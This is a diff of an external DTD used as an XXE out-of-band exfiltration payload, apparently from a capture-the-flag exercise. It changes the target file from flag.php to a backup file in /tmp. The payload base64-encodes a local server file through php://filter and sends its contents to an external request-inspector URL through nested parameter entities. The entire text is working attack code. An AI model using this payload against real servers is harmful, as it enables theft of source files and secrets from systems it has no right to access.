@@ -1,4 +1,4 @@
-<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///tmp/index.php.bak">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/inspect/01dtzncsf04snzhraqc02ae3v9/%data;'>">
 %int;
 %trick;
